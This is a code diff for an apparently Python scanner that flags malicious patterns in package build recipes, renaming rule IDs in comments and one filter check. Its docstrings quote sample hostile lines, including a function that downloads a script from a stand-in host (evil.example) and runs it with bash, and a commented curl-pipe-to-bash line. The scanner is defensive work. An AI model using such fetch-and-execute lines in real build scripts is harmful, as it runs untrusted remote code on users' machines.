@@ -22,7 +22,7 @@ _log = logging.getLogger(__name__)
 # Lines starting with # after stripping + prefix are comments.
 # Dependency declarations contain package names, not code; matching
 # inside them produces false positives.  validpgpkeys is deliberately
-# excluded: it is covered by rule R014 and must not be filtered out.
+# excluded: it is covered by rule H005 and must not be filtered out.
 _COMMENT_OR_DEP_RE = re.compile(
     r"^(?:\+|)\s*(?:"
     r"#"
@@ -58,7 +58,7 @@ def _has_unquoted_redirect(line: str) -> bool:
     `echo "x" > file` writes a file rather than addressing a reader, which
     is the ordinary way a recipe appends a line to a system config. A `>`
     *inside* the quotes is punctuation: `echo "==> run sudo pacman -S qemu"`
-    is the exact shape whose message classification keeps R062 and R081 off
+    is the exact shape whose message classification keeps H017 and H035 off
     printed instructions, and searching the whole line for `>` put that
     false positive back on two benign packages.
 
@@ -604,7 +604,7 @@ class ScopeResolver:
         _fetch() { curl -fsSL https://evil.example/x.sh -o "$srcdir/x.sh"; }
         build()  { _fetch; bash "$srcdir/x.sh"; }
 
-    ``_fetch`` is not in ``_CRITICAL_FUNCTIONS``, so R061 and R137 both stood
+    ``_fetch`` is not in ``_CRITICAL_FUNCTIONS``, so H016 and H082 both stood
     down and a working fetch-and-execute scored as an ordinary download.
     R051 had already been given the call closure for its ``pkgver`` scope;
     this is the same closure, shared, so the remaining rules stop being
@@ -739,7 +739,7 @@ def apply_rules(
 
     # Comments are filtered for raw-line rules by `filter_raw_lines` and were
     # not filtered for resolved ones, so a resolved rule read commented-out
-    # text as code: `# curl ... | bash` scored R001 CRITICAL and R061 HIGH,
+    # text as code: `# curl ... | bash` scored R001 CRITICAL and H016 HIGH,
     # a Critical band on a line that runs nothing.
     #
     # Two lists rather than one filtered list, because `include_comments` is
@@ -771,9 +771,9 @@ def apply_rules(
             continue
         if rule.get("experimental") and not include_experimental:
             continue
-        # R009 is a code rule (analysis/build.py).  A stale rules.toml from
+        # H004 is a code rule (analysis/build.py).  A stale rules.toml from
         # before the migration would otherwise double-fire the regex form.
-        if rule["id"] == "R009":
+        if rule["id"] == "H004":
             continue
 
         match_target = rule.get("match_target", "raw_line")
